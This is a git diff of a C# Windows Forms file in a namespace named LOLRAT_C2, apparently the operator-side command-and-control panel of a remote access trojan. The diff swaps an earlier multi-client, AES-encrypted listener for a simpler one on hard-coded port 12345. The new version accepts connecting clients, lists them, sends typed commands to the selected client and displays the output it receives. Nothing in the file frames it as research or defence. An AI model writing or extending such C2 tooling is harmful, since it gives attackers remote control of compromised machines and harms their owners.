@@ -13,214 +13,88 @@ namespace LOLRAT_C2
 {
     public partial class Form1 : Form
     {
-        private TcpListener server;
-        private List<TcpClient> connectedClients = new List<TcpClient>();
-        private bool isListening = false;
+        TcpListener server = null;
+        Thread listenThread;
+        TcpClient client;
+        NetworkStream stream;
 
         public Form1()
         {
             InitializeComponent();
+            listenThread = new Thread(new ThreadStart(ListenForClients));
+            listenThread.Start();
         }
 
-        private static byte[] encryptionKey = Encoding.ASCII.GetBytes("YourEncryptionKey");
-        private static byte[] encryptionIV = Encoding.ASCII.GetBytes("YourEncryptionIV");
-
-        private byte[] EncryptData(string data)
-        {
-            using (Aes aesAlg = Aes.Create())
-            {
-                aesAlg.Key = encryptionKey;
-                aesAlg.IV = encryptionIV;
-
-                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
-
-                using (MemoryStream msEncrypt = new MemoryStream())
-                {
-                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
-                    {
-                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
-                        {
-                            swEncrypt.Write(data);
-                        }
-                    }
-
-                    return msEncrypt.ToArray();
-                }
-            }
-        }
-
-        private string DecryptData(byte[] encryptedData)
-        {
-            using (Aes aesAlg = Aes.Create())
-            {
-                aesAlg.Key = encryptionKey;
-                aesAlg.IV = encryptionIV;
-
-                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
-
-                using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
-                {
-                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
-                    {
-                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
-                        {
-                            return srDecrypt.ReadToEnd();
-                        }
-                    }
-                }
-            }
-        }
-
-        private void AddClientToListBox(string clientIP)
-        {
-            if (InvokeRequired)
-            {
-                Invoke(new Action(() => AddClientToListBox(clientIP)));
-            }
-            else
-            {
-                listBoxClients.Items.Add(clientIP);
-            }
-        }
-
-        private void RemoveClientFromListBox(string clientIP)
-        {
-            if (InvokeRequired)
-            {
-                Invoke(new Action(() => RemoveClientFromListBox(clientIP)));
-            }
-            else
-            {
-                listBoxClients.Items.Remove(clientIP);
-            }
-        }
-
-
-        private void StartListener(int port)
+        private void ListenForClients()
         {
             try
             {
-                server = new TcpListener(IPAddress.Any, port);
+                server = new TcpListener(IPAddress.Any, 12345);
                 server.Start();
-                UpdateStatus($"Listening on port {port}...");
 
-                Thread listenerThread = new Thread(() =>
+                while (true)
                 {
-                    while (isListening)
-                    {
-                        try
-                        {
-                            TcpClient client = server.AcceptTcpClient();
-                            connectedClients.Add(client);
-                            UpdateStatus($"Client connected from {((IPEndPoint)client.Client.RemoteEndPoint).Address}");
+                    client = server.AcceptTcpClient();
+                    Invoke(new Action(() => listBoxClients.Items.Add(client.Client.RemoteEndPoint.ToString())));
 
-                            Thread clientThread = new Thread(() => HandleClient(client));
-                            clientThread.Start();
-                        }
-                        catch (SocketException)
-                        {
-                            // Handle exceptions as needed.
-                        }
-                    }
-                });
-
-                listenerThread.Start();
+                    stream = client.GetStream();
+                    Thread receiveThread = new Thread(new ThreadStart(ReceiveData));
+                    receiveThread.Start();
+                }
             }
-            catch (Exception ex)
+            catch (SocketException e)
             {
-                MessageBox.Show($"Error starting listener: {ex.Message}");
+                MessageBox.Show("SocketException: " + e);
+                server.Stop();
             }
         }
 
-        private void HandleClient(TcpClient client)
+        private void ReceiveData()
         {
             try
             {
-                NetworkStream stream = client.GetStream();
-                StreamReader reader = new StreamReader(stream, Encoding.UTF8);
-                StreamWriter writer = new StreamWriter(stream, Encoding.UTF8);
-
-                while (isListening)
+                while (true)
                 {
-                    try
+                    byte[] data = new byte[256];
+                    int bytesRead = stream.Read(data, 0, data.Length);
+                    if (bytesRead > 0)
                     {
-                        string command = reader.ReadLine();
-                        if (string.IsNullOrEmpty(command))
-                        {
-                            break; // Client disconnected
-                        }
-
-                        // Execute the command
-                        string result = ExecuteCommand(command);
-
-                        // Send the result back to the client
-                        writer.WriteLine(result);
-                        writer.Flush();
-                    }
-                    catch (IOException)
-                    {
-                        // Handle exceptions as needed.
+                        string receivedText = Encoding.UTF8.GetString(data, 0, bytesRead);
+                        Invoke(new Action(() => txtOutput.AppendText(receivedText + Environment.NewLine)));
                     }
                 }
-
+            }
+            catch (IOException e)
+            {
+                MessageBox.Show("IOException: " + e);
                 client.Close();
-                connectedClients.Remove(client);
-                UpdateStatus($"Client disconnected from {((IPEndPoint)client.Client.RemoteEndPoint).Address}");
-            }
-            catch (Exception ex)
-            {
-                // Handle exceptions as needed.
             }
         }
 
-        private string ExecuteCommand(string command)
+        private void btnSend_Click(object sender, EventArgs e)
         {
-            // Implement command execution here.
-            // You can use Process.Start to execute system commands.
-            // Make sure to capture the command's output and return it as a result.
-            return "Command execution result";
-        }
-
-
-        private void UpdateStatus(string message)
-        {
-            lbChat.Items.Add($"{message}");
-        }
-
-        private void StopListener()
-        {
-            isListening = false;
-            server.Stop();
-            UpdateStatus("Server stopped.");
-        }
-
-        private void btnCompile_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void btnListen_Click(object sender, EventArgs e)
-        {
-            if (!isListening)
+            if (listBoxClients.SelectedItem != null && txtCommand.Text != "")
             {
-                int ActivePort;
-                if (int.TryParse(txtActivePort.Text, out ActivePort))
+                try
                 {
-                    StartListener(ActivePort);
-                    isListening = true;
-                    btnListen.Text = "Stop Listening";
+                    byte[] data = Encoding.ASCII.GetBytes(txtCommand.Text);
+                    stream.Write(data, 0, data.Length);
                 }
-                else
+                catch (IOException ex)
                 {
-                    MessageBox.Show("Invalid port number. Please enter a valid integer.");
+                    MessageBox.Show("IOException: " + ex);
                 }
             }
-            else
+        }
+
+        protected override void OnFormClosing(FormClosingEventArgs e)
+        {
+            base.OnFormClosing(e);
+            if (server != null)
             {
-                StopListener();
-                isListening = false;
-                btnListen.Text = "Start Listening";
+                server.Stop();
             }
+            Environment.Exit(0);
         }
     }
 }
